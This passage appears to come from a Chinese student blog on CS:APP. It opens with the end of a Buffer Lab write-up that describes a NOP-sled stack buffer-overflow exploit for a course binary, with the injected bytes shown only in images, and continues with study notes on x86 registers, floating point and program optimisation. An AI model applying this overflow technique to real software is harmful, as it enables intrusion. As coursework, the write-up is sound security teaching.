<li><p>查看<code>testn</code>将<code>eax</code>返回值赋给<code>val</code>的指令地址为<code>0x8048ce2</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200930760.png" alt="image-20210604200930760"></p>
</li>
<li><p>我们这一题的思路是：因为这一等级缓冲区首地址会变化，所以我们不能直接GDB调试去得到一个确切的起始地址，我们需要用到nop指令，将有效机器指令尽可能往较大的地址处放，前面填充nop指令，这样跳转到哪里我们都能成功执行我们的恶意代码。</p>
</li>
<li><p>因为要恢复ebp存储<code>testn</code>的帧指针，查看<code>testn</code>的汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov %esp,%ebp</span><br><span class="line"># 此时esp和ebp相等</span><br><span class="line">push %ebx</span><br><span class="line"># 此时ebp=esp+0x4</span><br><span class="line">sub $0x24,%esp</span><br><span class="line"># 这个时候执行完后，ebp=esp+0x28，这就是esp和ebp每次的变化关系，通过esp来恢复我们的每次的ebp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604235350148.png" alt="image-20210604235350148"></p>
</li>
<li><p>编写恶意代码实现恢复ebp、cookie作为返回值、下一条指令地址压入栈中、返回地址出栈。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212313389.png" alt="image-20210604212313389"></p>
</li>
<li><p>gcc和objdump得到代码的字节序列。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212418838.png" alt="image-20210604212418838"></p>
</li>
<li><p>gcc得到大概的几个首地址，这里取的是最大的<code>0x55682e48</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212514423.png" alt="image-20210604212514423"></p>
</li>
<li><p>构造exploit string<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212346929.png" alt="image-20210604212346929"></p>
</li>
<li><p>验证，成功，实验结束。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212437957.png" alt="image-20210604212437957"></p>
</li>
</ul>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验时间很紧张，主要是我的原因，到现在终于圆满完成，还是值得庆祝的。</p>
<p>花费时间最长的部分其实是英文文档的阅读，读起来太过吃力。</p>
<p>这个实验让我对缓冲溢出漏洞有了直观的认识，重新复习了栈的原理，了解了易于遭受缓冲区攻击代码的危险性。</p>
<p>作业要早早完成，不然会掉头发的。</p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——基础知识</title>
    <url>/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——基础知识"><a href="#深入理解计算机系统——基础知识" class="headerlink" title="深入理解计算机系统——基础知识"></a>深入理解计算机系统——基础知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了方便我查询一些我可能会忘记的基础知识，我写下这篇博客</p>
<p>中间可能有自己的一些经验看法</p>
<p>以下的知识没有先后顺序，用时特定自查</p>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210503221648779.png" alt="image-20210503221648779"></p>
<ul>
<li><p><code>EAX</code> 是”累加器”(accumulator)，它是很多<strong>加法乘法</strong>指令的<strong>缺省寄存器</strong>。</p>
</li>
<li><p><code>EBX</code> 是”基地址”(base)寄存器，在<strong>内存寻址</strong>时存放<strong>基地址</strong>。</p>
</li>
<li><p><code>ECX</code> 是计数器(counter)，是重复(<strong>REP</strong>)前缀指令和<strong>LOOP</strong>指令的<strong>内定计数器</strong>。</p>
</li>
<li><p><code>EDX </code>则总是被用来放<strong>整数除法</strong>产生的<strong>余数</strong>。</p>
</li>
<li><p><code>ESI/EDI</code> 分别叫做”源/目标索引寄存器”(source/destination index)，因为在很多<strong>字符串操作</strong>指令中，<code>DS:ESI</code>指向<strong>源串</strong>,而<code>ES:EDI</code>指向<strong>目标串</strong>.</p>
</li>
<li><p><code>EBP</code> 是”基址指针”(BASE POINTER)，它最经常被用作高级语言函数调用的”<strong>框架指针</strong>“(frame pointer)， 在破解的时候,经常可以看见一个标准的函数起始代码（左为目标寄存器）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp ;保存前一个函数帧指针ebp</span><br><span class="line">mov ebp,esp ;EBP设为当前帧指针</span><br><span class="line">sub esp, xxx ;预留xxx字节给函数临时变量.</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><code>ESP</code> 专门用作堆栈指针，被形象地称为<strong>栈顶指针</strong>，堆栈的顶部是地址小的区域，压入堆栈的数据越多，<strong>ESP也就越来越小</strong>。在<strong>32位系统</strong>中，<code>ESP</code><strong>每次减少4字节</strong>。</li>
<li>使用惯例：<code>eax</code>,<code>edx</code>,<code>ecx</code>被划分为<strong>调用者</strong>保存寄存器；<code>ebx</code>,<code>esi</code>,<code>edi</code>被划分为<strong>被调用者</strong>保存寄存器</li>
</ul>
<h2 id="专用寄存器"><a href="#专用寄存器" class="headerlink" title="专用寄存器"></a>专用寄存器</h2><ul>
<li><p><code>EIP</code>指令指针（Instruction Pointer.）。代码段中下一个指令的指针。自动更新。</p>
</li>
<li><p><code>ESP</code>堆栈指针（Stack pointer.）。指针指向栈顶（在<code>SS</code>（Stack Segment）栈段寄存器）。与POP、PUSH、CALL等指令一起使用</p>
</li>
</ul>
<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><table>
<thead>
<tr>
<th>寄存器名</th>
<th>寄存器功能</th>
</tr>
</thead>
<tbody><tr>
<td>CS</td>
<td>Code Segment. 代码段</td>
</tr>
<tr>
<td>DS</td>
<td>Data Segment. 数据段</td>
</tr>
<tr>
<td>SS</td>
<td>Stack Segment. 栈堆段</td>
</tr>
<tr>
<td>ES</td>
<td>Extra Data Segment. 额外数据段</td>
</tr>
<tr>
<td>FS</td>
<td>Extra Data Segment.额外数据段</td>
</tr>
<tr>
<td>GS</td>
<td>Extra Data Segment.额外数据段</td>
</tr>
</tbody></table>
<h2 id="EFLAGS寄存器"><a href="#EFLAGS寄存器" class="headerlink" title="EFLAGS寄存器"></a>EFLAGS寄存器</h2><p><code>EFLAGS(program status and control) register</code>主要用于<strong>提供程序的状态</strong>及<strong>进行相应的控制</strong></p>
<p><code>EFLAGS</code> 标志。<code>cpu</code>中各种条件的状态。 <code>EFLAGS</code>寄存器的各个位的用途如下所述：</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210508092423969.png" alt="image-20210508092423969"></p>
<ul>
<li><code>00 Carry (CF)</code>：保存加法后的进位或者减法后的借位。 也指示错误情况。</li>
<li><code>02 Parity (PF)</code>：奇数位数为0，偶数位数为1。<code>80x86</code>的过时功能。</li>
<li><code>04 Auxiliary Carry (AF)</code>：BCD加法或者减法后，<code>DAA</code>和<code>DAS</code>指令使用的高度专用标志。</li>
<li><code>06 Zero (ZF)</code>：如果算术或逻辑指令的结果为0，则<code>ZF</code>为1。</li>
<li><code>07 Sign (SF)</code>：如果算术或逻辑指令的结果符号为负，则<code>SF</code>为1。</li>
<li><code>08 Trap (TF)</code>：陷阱使能。微处理器在调试和控制寄存器指示的条件下中断指令流。</li>
<li><code>09 Interrupt (深入理解计算机系统——基础知识/iF)</code>：控制<code>INTR</code>(深入理解计算机系统——基础知识/interrupt request)引脚的操作。如果为1，中断使能。由<code>STI</code>和<code>CLI</code>指令设置。</li>
<li><code>10 Direction (DF)</code>：指定在<strong>字符串指令</strong>期间<code>DI</code>和/或<code>SI</code>寄存器的<strong>递增或递减模式</strong>。如果<code>DF</code>为1，寄存器<strong>自动递减</strong>。由<code>STD</code>和<code>CLD</code>指令设定。</li>
<li><code>11 Overflow (OF)</code>：为加法和减法指令设置。</li>
<li><code>12 and 13 I/O privilege level (深入理解计算机系统——基础知识/iOPL)</code>：保持代码必须运行的特权级别，以便执行任何与输入输出相关的指令。00是最高的。</li>
<li><code>14 Trap Nested Task (NT)</code>：当一个系统任务在保护模式下通过<code>call</code>指令调用另一个系统任务时设置。</li>
</ul>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210508102645978.png" alt="image-20210508102645978"></p>
<ul>
<li>下半部分不记录了，用不到</li>
</ul>
<h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>一个浮点数由三部分组成：</p>
<ol>
<li>符号。1为负，0为正，数值0特殊处理</li>
<li>阶码，移码（将补码的符号位取反减一）表示，所以我们将阶码加1取反符号位得到的就是指数。</li>
<li>尾数，顺序排列尾数。如1000 0000表示的是0.1</li>
</ol>
<p>规格化数，1.f * 2^E，E在区间（-126，127）<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210615213403180.png" alt="image-20210615213403180"></p>
<p>非规格化数，0.f * 2^(-126)<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210615213416002.png" alt="image-20210615213416002"></p>
<p>特殊值</p>
<ol>
<li><p>NAN，不是一个数<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210615213454261.png" alt="image-20210615213454261"></p>
</li>
<li><p>无穷大</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210615213441105.png" alt="image-20210615213441105"></p>
</li>
</ol>
<h2 id="一些容易忽略的指令"><a href="#一些容易忽略的指令" class="headerlink" title="一些容易忽略的指令"></a>一些容易忽略的指令</h2><ul>
<li><p><code>call</code>指令：过程调用，将返回地址入栈，并跳转到被调用过程的起始处。返回地址就是紧跟在<code>call</code>后的那条指令的地址。</p>
</li>
<li><p><code>ret</code>指令：从过程调用中返回，将返回地址出栈，并跳转到返回地址。</p>
</li>
<li><p><code>push</code>指令：入栈，<code>esp</code>减4字节，操作数就是入栈的数据</p>
</li>
<li><p><code>pop</code>指令：出栈，<code>esp</code>加4字节，操作数就是出栈的数据保存的地址</p>
</li>
<li><p><code>cmp</code>指令：比较指令，<code>cmp s2,s1</code>基于<code>s1-s2</code>，只设置条件码</p>
</li>
<li><p><code>test</code>指令：测试指令，<code>test s2,s1</code>基于<code>s1&amp;s2</code>，只设置条件码</p>
</li>
<li><p><code>leave</code>指令：为返回准备栈，等价于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  %ebp,%esp            //栈指针设置为帧指针</span><br><span class="line">popl  %ebp                 //ebp存储一开始被保存的旧的ebp,esp指向返回地址的节点</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="栈帧图"><a href="#栈帧图" class="headerlink" title="栈帧图"></a>栈帧图</h2><p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1.png" alt="栈帧图"></p>
<p>用c语言描述函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">( (<span class="keyword">void</span>)arrgument <span class="number">1</span>, (<span class="keyword">void</span>)arrgument <span class="number">2</span>, ....... ,(<span class="keyword">void</span>)arrgument n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> local variable <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">void</span> local variable <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">void</span> local variable <span class="number">3</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">void</span> local variable n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>图中的地址从上往下递减的，栈顶在下，栈底在上。</p>
<p><code>Return address</code>和<code>Previous frame pointer</code>分别是<strong>返回地址</strong>和<strong>调用者的帧指针</strong>。</p>
<h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">功能</th>
<th align="center">条件</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>JE</code></td>
<td align="center">相等则跳转</td>
<td align="center"><code>ZF</code>=1</td>
</tr>
<tr>
<td align="center"><code>JNE</code></td>
<td align="center">不相等则跳转</td>
<td align="center"><code>ZF</code>=0</td>
</tr>
<tr>
<td align="center"><code>JA</code></td>
<td align="center">无符号大于则跳转</td>
<td align="center"><code>CF</code>=0 and<code>ZF</code>=0</td>
</tr>
<tr>
<td align="center"><code>JG</code></td>
<td align="center">有符号大于则跳转</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>JS</code></td>
<td align="center">为负则跳转</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>jle</code></td>
<td align="center">有符号小于或者等于跳转</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>JGE</code></td>
<td align="center">有符号大于或等于跳转</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>JBE</code></td>
<td align="center">无符号小于等于则跳转</td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="优化程序性能"><a href="#优化程序性能" class="headerlink" title="优化程序性能"></a>优化程序性能</h2><p><strong>程序优化的第一步</strong>就是<strong>消除不必要的内容</strong>，让代码尽可能有效地执行它期望的工作。<strong>这包括消除不必要的函数调用、条件测试和存储器引用</strong>。使用<strong>图形数据流表示法</strong>，可以使处理器对指令的执行形象化，我们还可以利用它预测程序的性能。、</p>
<p><strong>程序优化的第二步</strong>，<strong>利用处理器提供的指令级并行能力，同时执行多条指令</strong>。</p>
<p><strong>Amdahl定律</strong>，可以量化对系统某个部分进行优化所带来的整体效果。<strong>主要思想</strong>是当我们加快系统一个部分的速度时，对系统整体性能的影响依赖于<strong>这个部分有多重要</strong>和<strong>速度提高了多少</strong>。所以<strong>要想大幅度提高系统的速度，我们必须按提高系统很大一部分的速度。</strong><br>$$<br>S=\frac{1}{(1-a+\frac{a}{n})}<br>$$<br>说明：</p>
<ol>
<li><p>S为全局加速倍数（原来总时间/加速后总时间）</p>
</li>
<li><p>a为并行计算所占比例（可以并行计算代码量/总代码量），就是可以优化的部分。</p>
</li>
<li><p>n为并行节点处理个数，可以理解为CPU的核心数，就是可以优化的倍数。</p>
</li>
<li><p>所以这个公式其实就是，将可以优化的部分优化n倍。</p>
</li>
</ol>
<p><strong>关键路径</strong>是在循环的反腐执行过程中形成的<strong>数据相关链</strong>，常常通过确认关键路径来决定<strong>执行一个循环所需要的时间</strong>。</p>
<p><strong>存储器别名使用</strong>是指两个指针可能同时指向同一个存储器的位置的情况。在只考虑执行安全的优化中，编译器必须假设不同的指针可能会指向存储器的同一个位置，这造成了<strong>第一个妨碍优化的因素</strong>，这也是可能严重限制编译器产生优化代码机会的程序的一个方面。如果编译器不能确定指针的指向，它就会假设所有的情况都有可能，所以我们需要做的就是在<strong>编写程序的时候明确指针的指向</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*q=y; *p=x;</span><br><span class="line">t1=*q;      <span class="comment">//t1= x or y?</span></span><br></pre></td></tr></table></figure>

<p><strong>函数调用</strong>是<strong>第二个妨碍优化的因素</strong>。尽可能减少函数的调用可以优化程序，但是编译器会假设最糟糕的情况，并<strong>保持所有的函数调用不变</strong>。所以，我们需要在<strong>编写程序的时候将函数调用的次数尽可能减少</strong>，这件事情只能coder来做，编译器为了安全是不会去做的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> f() + f() + f() + f();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span> * f();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这两个函数看似得到的是同一个结果，而且fun2函数明显要优于fun1，因为函数调用次数少。 */</span></span><br><span class="line"><span class="comment">/* 如果f()代码如下    */</span></span><br><span class="line"><span class="keyword">int</span> counter=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 因为f改变了全局变量counter，所以fun1和fun2的功能完全不同，分别是return (0+1+2+3)和return 4*0</span></span><br><span class="line"><span class="comment">** 所以，我们不能期望编译器自己将fun1改变成fun2去优化程序，因为这种情况不安全     </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>用内联函数优化函数调用</strong>是指<strong>将函数调用替换为函数体</strong>。这样做既<strong>减少函数调用的开销</strong>，也允许对展开的函数做<strong>进一步的优化</strong>。</p>
<p><strong>每元素的周期数</strong>（Cycles Per Element ，<strong>CPE</strong>）作为<strong>程序性能的度量标准</strong>。它的计算过程是：先得到函数的元素个数和周期的散点图，后经过<strong>最小二乘方拟合</strong>得到折线图，其中<strong>折线的斜率</strong>表明<strong>每元素的周期数CPE</strong>。</p>
<p><strong>消除循环的低效率</strong>，<code>for(深入理解计算机系统——基础知识/i=0;i&lt;vec_length();i++)</code>调用函数作为循环的测试条件，意味着我们需要调用很多次函数，这是非常低效的。<strong>代码移动</strong>可以优化事变要执行很多次却不改变计算结果的计算，在本例中，我们将<strong>循环内部的的函数调用移到循环前面</strong>。</p>
<p><strong>减少过程调用</strong>，还是减少循环中函数的调用，这次是<strong>用数组直接取值来代替用函数取值</strong>。</p>
<p><strong>消除不必要的存储器引用</strong>，直接用指针来取值会对<strong>存储器</strong>进行读出或写入的操作，我们用<strong>临时变量来代替指针取值</strong>，可以直接在<strong>寄存器</strong>上操作，这会大大增强函数性能。</p>
<h2 id="算术运算的延迟和发射时间"><a href="#算术运算的延迟和发射时间" class="headerlink" title="算术运算的延迟和发射时间"></a>算术运算的延迟和发射时间</h2><p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210524204719636.png" alt="image-20210524204719636"></p>
<h2 id="利用微处理器微体系结构的优化"><a href="#利用微处理器微体系结构的优化" class="headerlink" title="利用微处理器微体系结构的优化"></a>利用微处理器微体系结构的优化</h2><p><strong>指令级并行</strong>指，在实际的处理器中，是<strong>同时对多条指令求值</strong>。在代码级上，似乎是一次执行一条指令，每条指令都包括从寄存器或存储器取值，执行一个操作，并把结果存回到一个寄存器或存储器位置。但是复杂奇异的微处理器结构让多条指令可以并行地执行，同时又呈现一种简单地顺序执行指令的表象。</p>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522105640532.png" alt="image-20210522105640532"></p>
<p><strong>两种界限描述了程序的最大性能</strong>：</p>
<ul>
<li><strong>延迟界限</strong>：当一系列操作必须严格顺序执行时，就会遇到延迟界限，因为在下一条指令开始前，这条指令必须结束。给出了函数所需要的最小CPE值。</li>
<li><strong>吞吐量界限</strong>：刻画了处理器功能单元的原始计算能力。这个界限是程序性能的终极限制。</li>
</ul>
<p><strong>分支预测技术</strong>，分支是指<strong>条件转移指令</strong>，现代处理器会猜测是否会选择分支，同时还预测分支的目标地址。使用<strong>投机执行</strong>的技术，处理器会开始取出位于它预测的分支会跳到的地方的指令，并对指令译码，甚至在它确定分支预测是否正确之前就开始执行这些操作。如<strong>果预测错误</strong>，会将状态重新设置到分支点的状态，并开始取出和执行另一个方向上的指令。</p>
<p><strong>边界检查</strong>是通过条件语句判断的，所以利用<strong>分支预测技术</strong>可以让处理器预测分支结果，不会让边界检查对程序执行中关键路径的指令取值和处理产生太大影响。所以<strong>不要过分关心可预测的分支</strong>。</p>
<p>对于<strong>本质上无法预测的情况</strong>，如果编译器能够产生使用<strong>条件数据传送</strong>而不是<strong>条件控制转移</strong>的代码，可以极大提高程序的性能。</p>
<p><strong>每个运算都是由两个周期计数值来刻画的：</strong></p>
<ul>
<li><strong>延迟</strong>：表示完成运算所需要的总时间。</li>
<li><strong>发射时间</strong>：表示两个连续的同类型运算之间需要的最小时钟周期数，发射时间的倒数是这个功能单元的最大吞吐量。</li>
<li><strong>我理解的延迟和发射时间</strong>：因为使用<strong>流水线</strong>实现运算，所以延迟是指<strong>完成一个流水线所需要的周期数</strong>，而发射时间指的是在流水线开始后，<strong>完成一个运算所需要的时钟周期数</strong>，它的倒数就是指每个周期可以完成多少运算，也就是功能单元的最大吞吐量。例如：整数加法的发射时间是0.33倒数是3，延迟是1，它有能力每个周期执行三个加法，但如果只执行一个加法，那时间还是一个周期。</li>
</ul>
<p><strong>完全流水化的功能单元</strong>是指发<strong>射时间为1的功能单元</strong>，每个时钟周期可以开始一个新的运算，</p>
<p>程序的<strong>数据流表示</strong>，作为分析在现代处理器上执行的机器级程序性能的一个工具，这是一种图形化的表示方法，展示了不同操作之间的<strong>数据相关</strong>是如何<strong>限制它们的执行顺序</strong>的。这种限制形成了图中的<strong>关键路径</strong>，这是<strong>执行一组机器指令所需时钟周期数的一个下界</strong>。</p>
<p> <strong>从机器级代码到数据流图：</strong></p>
<ul>
<li><strong>机器级代码</strong><br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522120656135.png" alt="image-20210522120656135"></li>
<li><strong>第一步</strong>，<strong>将机器级代码译码成操作</strong>。如图所示：<strong>左边的</strong>方框和线给出各个指令是如何使用和更新寄存器的，<strong>顶部的</strong>方框表示开始时的寄存器值，<strong>底部的</strong>方框表示最后寄存器的值，<strong>右边的</strong>是各种操作，<strong>弧线</strong>表示操作产生的不对应于任何寄存器的值，相连的两个操作具有相关性（A-&gt;B，指必须等A结束，B才能进行）。</li>
</ul>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522121059669.png" alt="image-20210522121059669"></p>
<ul>
<li><strong>第二步</strong>，<strong>将操作抽象城数据流图</strong>。<strong>重新排列操作符</strong>，更清晰地表明了从顶部<strong>源寄存器</strong>（只读寄存器和循环寄存器）到底部<strong>目的寄存器</strong>（只写寄存器和循环寄存器）的<strong>数据流</strong>。如图所示：白色操作符表示无关操作符（不属于某个循环寄存器之间的相关链），蓝色操作符则相反。</li>
</ul>
<p><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522121658954.png" alt="image-20210522121658954"></p>
<ul>
<li><strong>第三步</strong>，<strong>消除了白色的操作符，只保留了循环寄存器</strong>。所以<strong>两大数据相关链条</strong>是：mul对程序值acc的修改、add对程序值i的修改。因为整数加法延迟1个周期，而单精度乘法延迟为4个周期，所以<strong>关键路径</strong>是mul对acc的修改，因为另一条链不会制约程序性能。<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522124136039.png" alt="image-20210522124136039"></li>
<li><strong>最后</strong>，我们将循环扩展，并将关键路径标出，得到数据流图。从图中我们看到，<strong>关键路径长为L*n</strong>，也就是说程序至少需要L*n个周期才能执行完。除了整数加法之外，测量出的CPE也确实等于<strong>运算的延迟 L</strong>。<br><img src="/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210522160424013.png" alt="image-20210522160424013"></li>
</ul>
<p>除了<strong>关键路径</strong>之外，还有其他的<strong>影响性能因素</strong>，包括<strong>可用的功能单元的数量</strong>和任何一步中<strong>功能单元之间能够传递数据值的数量</strong>，这也是为什么<strong>整数加法</strong>不等于<strong>关键路径期望的CPE</strong>。</p>
<p>看上去，延迟界限是基本的界限，限制了合并运算能执行的速度。接下来的优化是调整操作的结构，增强指令级并行性。</p>
<p>我们想对程序做变换，使得唯一的限制变成吞吐量界限。</p>
<p><strong>循环展开</strong>是一种程序变换，<strong>通过增加每次迭代计算的元素的数量，减少循环的迭代次数</strong>。<strong>首先，</strong>它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。<strong>其次，</strong>它提供了一些方法（例如<strong>重关联变换优化</strong>，就是改变值合并的顺序），可以进一步变化代码，减少整个计算中关键路径上的操作数量。</p>
<p><strong>提高并行性</strong>，因为<strong>数据相关</strong>，虽然<strong>功能单元</strong>能够做到<strong>采用流水线一个周期开始一个新的操作</strong>，但是它只会<strong>每L（延迟）个周期开始一个新的操作</strong>。我们需要打破这种顺序相关，得到比延迟界限更好性能的方法。</p>
<ul>
<li><strong>多个累计变量</strong>，<strong>多个关键路径并行</strong>，这种方法利用了<strong>功能单元的流水线</strong>能力。在k更大一些，CPE不会更低是因为功能单元已经在最大负荷下工作了，也就是吞吐量界限。</li>
<li><strong>重新结合变换</strong>，<strong>减少关键路径上操作的数量</strong>，另一种打破顺序相关从而使性能提高到延迟界限之外的方法。另一条数据相关链可以很快得进行处理，不会影响程序性能。样例中<code>(x * array[n-1]) * array[n] =&gt; x * (array[n-1] * array[n]) </code></li>
</ul>
<h2 id="理解存储器性能"><a href="#理解存储器性能" class="headerlink" title="理解存储器性能"></a>理解存储器性能</h2><p><strong>加载操作对性能的影响</strong></p>
<ul>
<li><p>加载操作是将内存中的数据读出到寄存器中。</p>
</li>
<li><p>一个包含加载操作的程序的性能既依赖于流水线的能力，也依赖于加载单元的延迟。</p>
</li>
<li><p>由于加载单元的每个时钟周期只能启动一条加载操作，所以CPE不可能小于1。</p>
</li>
